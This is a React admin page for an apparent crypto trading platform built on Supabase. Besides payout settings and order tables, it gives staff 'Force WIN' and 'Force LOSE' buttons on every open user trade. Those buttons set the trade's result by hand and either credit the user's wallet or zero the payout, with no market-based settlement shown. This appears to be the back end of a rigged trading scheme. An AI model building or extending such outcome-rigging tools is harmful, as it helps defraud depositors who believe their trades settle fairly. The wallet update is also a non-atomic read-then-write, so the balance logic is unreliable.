

import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "../../lib/supabase";
import "./AdminTrades.css";



export default function AdminTrades() {

  const navigate = useNavigate();

  const [settings, setSettings] = useState([]);

  const [orders, setOrders] = useState([]);

  const [loading, setLoading] = useState(true);

const [search, setSearch] = useState("");

const [statusFilter, setStatusFilter] = useState("all");

  useEffect(() => {

  loadSettings();
  loadOrders();

  const timer = setInterval(() => {
    loadOrders();
  }, 3000);

  return () => clearInterval(timer);

}, []);

  async function loadSettings() {
    const { data } = await supabase
      .from("trade_settings")
      .select("*")
      .order("duration", { ascending: false });

    setSettings(data || []);
  }

  async function loadOrders() {
  const { data, error } = await supabase
    .from("trades")
    .select("*")
    .order("created_at", { ascending: false });

  if (error) {
    console.error(error);
  }

  setOrders(data || []);
  setLoading(false);
}

  async function saveSetting(item) {
    await supabase
      .from("trade_settings")
      .update({
        payout: item.payout,
        minimum: item.minimum,
        enabled: item.enabled,
      })
      .eq("id", item.id);

    alert("Saved");
  }

  // =====================
// Force WIN
// =====================
// =====================
// FORCE WIN
// =====================

async function forceWin(order){

  if(order.result){

    alert("Order completed");

    return;

  }

  if(order.status !== "trading"){

 alert("Trade already finished");

 return;

}


  const profit =
    Number(order.amount) *
    Number(order.profit || 0) /
    100;


  const payout =
    Number(order.amount) +
    profit;



  const { error } = await supabase
    .from("trades")
    .update({

      status:"finished",

      result:"win",

      payout:payout,

      profit_amount:profit,

      finished_at:new Date().toISOString()

    })
    .eq("id",order.id);



  if(error){

    alert(error.message);

    return;

  }

  const { data: wallet } = await supabase
  .from("wallets")
  .select("balance")
  .eq("user_id", order.user_id)
  .single();

await supabase
  .from("wallets")
  .update({
    balance:
      Number(wallet.balance) +
      payout
  })
  .eq("user_id", order.user_id);


  loadOrders();

}
// =====================
// Force LOSE
// =====================
// =====================
// FORCE LOSE
// =====================

async function forceLose(order){


  if(order.result){

    alert("Order completed");

    return;

  }


  const { error } = await supabase
    .from("trades")
    .update({

      status:"finished",

      result:"lose",

      payout:0,

      profit_amount:0,

      finished_at:new Date().toISOString()

    })
    .eq("id",order.id);



  if(error){

    alert(error.message);

    return;

  }


  loadOrders();

}

  const filteredOrders = orders.filter((order) => {

  const keyword = search.toLowerCase();

  const matchSearch =
  String(order.user_id).includes(keyword) ||
  order.coin?.toLowerCase().includes(keyword);

  const matchStatus =
    statusFilter === "all"
      ? true
      : order.status === statusFilter;

  return matchSearch && matchStatus;

});

  if (loading) return <div>Loading...</div>;

  return (
    <div className="admin-page">

       <button
        className="back-btn"
        onClick={() => navigate(-1)}
      >
        ← Back
      </button>

      <div className="trade-dashboard">

<div className="trade-card">

<h3>Total Orders</h3>

<p>{orders.length}</p>

</div>

<div className="trade-card">

<h3>Trading</h3>

<p>

{

orders.filter(o => o.status === "trading").length

}

</p>

</div>

<div className="trade-card">

<h3>Completed</h3>

<p>

{

orders.filter(o => o.status === "finished").length

}

</p>

</div>

<div className="trade-card">

<h3>Win</h3>

<p>

{

orders.filter(o=>o.result==="win").length

}

</p>

</div>

<div className="trade-card">

<h3>Lose</h3>

<p>

{

orders.filter(o=>o.result==="lose").length

}

</p>

</div>

</div>

      <h2>Trade Settings</h2>

      <table>
        <thead>
          <tr>
            <th>Minutes</th>
            <th>Payout %</th>
            <th>Minimum</th>
            <th>Enabled</th>
            <th></th>
          </tr>
        </thead>

        <tbody>

          {settings.map((item) => (

            <tr key={item.id}>

              <td>{item.duration}</td>

              <td>
                <input
                  type="number"
                  value={item.payout}
                  onChange={(e) => {
                    item.payout = Number(e.target.value);
                    setSettings([...settings]);
                  }}
                />
              </td>

              <td>
                <input
                  type="number"
                  value={item.minimum}
                  onChange={(e) => {
                    item.minimum = Number(e.target.value);
                    setSettings([...settings]);
                  }}
                />
              </td>

              <td>
                <input
                  type="checkbox"
                  checked={item.enabled}
                  onChange={(e) => {
                    item.enabled = e.target.checked;
                    setSettings([...settings]);
                  }}
                />
              </td>

              <td>
                <button
                  onClick={() => saveSetting(item)}
                >
                  Save
                </button>
              </td>

            </tr>

          ))}

        </tbody>

      </table>

      <h2 style={{ marginTop: 40 }}>
        Orders
      </h2>

      <div className="trade-toolbar">

<input

placeholder="Search UID / Symbol"

value={search}

onChange={(e)=>setSearch(e.target.value)}

/>

<select

value={statusFilter}

onChange={(e)=>setStatusFilter(e.target.value)}

>

<option value="all">
All
</option>

<option value="trading">
Trading
</option>

<option value="finished">
Finished
</option>

</select>

</div>

      <table>

        <thead>

          <tr>

            <th>User</th>

            <th>Symbol</th>

            <th>Side</th>

            <th>Amount</th>

            <th>Status</th>

            <th>Result</th>

            <th>Profit</th>

            <th>Created</th>

            <th>Action</th>

          </tr>

        </thead>

        <tbody>

          {filteredOrders.map((order) => (

            <tr key={order.id}>

              <td>{order.user_id}</td>

              <td>{order.coin}</td>

              <td>{order.side}</td>

              <td>${order.amount}</td>

              <td>

                <span

                className={`status ${order.status}`}

                >

                {order.status}

                </span>

                </td>

              <td>

                <span

                className={`result ${order.result}`}

                >

                {order.result || "-"}

                </span>

                </td>

              <td>${order.profit || 0}</td>

              <td>

              {

              new Date(

              order.created_at

              ).toLocaleString()

              }

              </td>

              <td>

                <button
                className="btn-win"
                onClick={() => forceWin(order)}
                >
                WIN
                </button>

                <button
                className="btn-lose"
                onClick={() => forceLose(order)}
                style={{marginLeft:8}}
                >
                LOSE
                </button>

                </td>

            </tr>

          ))}

        </tbody>

      </table>

    </div>
  );
}
